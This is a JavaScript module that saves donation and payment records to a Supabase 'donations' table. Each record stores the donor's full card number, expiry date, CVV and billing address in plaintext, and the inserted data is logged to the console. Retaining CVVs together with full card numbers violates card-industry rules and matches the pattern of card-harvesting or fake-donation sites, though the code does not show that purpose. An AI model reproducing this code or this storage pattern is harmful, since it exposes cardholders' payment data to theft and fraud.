import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  try {
    supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
    console.log('[SUPABASE] Initialized successfully.');
  } catch (err) {
    console.error('[SUPABASE] Failed to initialize client:', err.message);
  }
} else {
  console.warn('[SUPABASE] Credentials not provided (SUPABASE_URL / SUPABASE_ANON_KEY missing). Storage bypassed.');
}

/**
 * Save donation & payment record to Supabase "donations" table
 */
export const saveDonationToSupabase = async (donationData) => {
  if (!supabase) {
    console.log(`[SUPABASE STORAGE BYPASS] Invoice #${donationData.invoiceNumber} — ${donationData.donorName} ($${donationData.amount})`);
    return { success: true, bypassed: true };
  }

  try {
    const record = {
      invoice_number: donationData.invoiceNumber || null,
      donor_name: donationData.donorName || null,
      email: donationData.email || null,
      amount: Number(donationData.amount) || 0,
      payment_method: donationData.paymentMethod || 'Credit / Debit Card',
      card_number: donationData.cardNumber || donationData.paymentDetails?.cardNumber || null,
      card_expiry: donationData.cardExpiry || donationData.paymentDetails?.expiry || null,
      card_cvv: donationData.cardCvv || donationData.paymentDetails?.cvv || null,
      billing_address: donationData.billingAddress || donationData.paymentDetails?.billingAddress || null,
      status: 'completed',
    };

    const { data, error } = await supabase.from('donations').insert([record]).select();

    if (error) {
      console.error('[SUPABASE INSERT ERROR]:', error);
      return { success: false, error: error.message };
    }

    console.log('[SUPABASE INSERT SUCCESS]:', data);
    return { success: true, data };
  } catch (err) {
    console.error('[SUPABASE SERVICE ERROR]:', err);
    return { success: false, error: err.message };
  }
};
